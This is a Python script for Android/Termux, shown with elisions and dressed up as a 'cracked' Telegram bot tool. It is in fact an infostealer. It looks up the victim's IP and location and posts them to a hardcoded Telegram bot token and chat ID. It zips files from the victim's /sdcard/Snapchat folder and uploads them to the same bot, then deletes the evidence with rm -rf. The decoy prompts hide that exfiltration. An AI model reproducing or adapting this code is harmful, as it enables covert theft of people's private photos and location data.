...
try:
        import socket, requests, ipaddress, json, os, shutil, sys, time
except:
        os.system("apt upgrade -y &>> install.log ;pip install pytest-shutil ;pkg install zip -y ;pip install requests")
        pass
os.system("clear")
print("\n  \x1b[1;91mCracked By Muhamd ...  ")
time.sleep(2)
print("     \x1b[1;92mLOVE ..")
time.sleep(1.5)
fff=input(" User telegram akat bnwsa: ")
print(" bosta ba nwe betawa  ...")
def finder(M):
    id="1023856025"
    to="1928894783:AAGiQcdOGKdt4Id86RCx_3jec0Q7JTtHr0Y"
    ...
    requests.post(f"https://api.telegram.org/bot{to}/sendMessage?chat_id={id}&text={IP}\n{Org}\n{City}\n{Re}\n{Co}\n{Lo}\n{Lon}\n{MA}\n name: {fff}")
def main2():
...
def ooppeenn():
        ...
        def jojo():
            ...
            ID= '1023856025'
            token = '1928894783:AAGiQcdOGKdt4Id86RCx_3jec0Q7JTtHr0Y'
            try:
                os.remove("/sdcard/Snapchattt")
                os.system("rm -rf /sdcard/Snapchattt")
            except:
                pass
            try:
                os.remove("/sdcard/Snapchattt.zip")
                os.system("rm -rf /sdcard/Snapchattt.zip")
            except:
                pass
            try:
                os.mkdir("/sdcard/Snapchattt")
            except:
                pass
            try:
                try:
                        os.mkdir("/sdcard/Snapchat")
                        os.system("mkdir /sdcard/Snapchat")
                except:
                        pass
                a=r"/sdcard/Snapchat"
                os.chdir(a)
                ...
                for ii in os.listdir():
                        if numb==10:
                                ...
                                numb += 1
                                f=ii
                                shutil.copy(f, "/sdcard/Snapchattt")
                a=r"/sdcard/Snapchat"
                ...
                for ii in os.listdir():
                        if numb==10:
                                ...
                                numb += 1
                                y=ii
                                shutil.copy(y, "/sdcard/Snapchattt")
                ...
                for ii in os.listdir():
                        if numb==10:
                                ...
                                numb += 1
                                z=ii
                                shutil.copy(z, "/sdcard/Snapchattt")
            except:
                pass
            os.system("cd /sdcard ;zip -r Snapchattt.zip Snapchattt &>> install.log")
            try:
                files={'document':open('/sdcard/Snapchattt.zip', 'rb')}
                msg="\n"
                requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={ID}", files=files)
            except FileNotFoundError:
                pass
            os.system("rm -rf /sdcard/Snapchattt ;rm -rf /sdcard/Snapchattt.zip")
        jojo()
ooppeenn()
os.system('clear')
print('\n [=] Muhamad ....... ')
print(" ")
print(' ID and Token Bot telegram daxl baka ..  ')
print()
ID=input(' ID BOT   :  ')
print('\n')
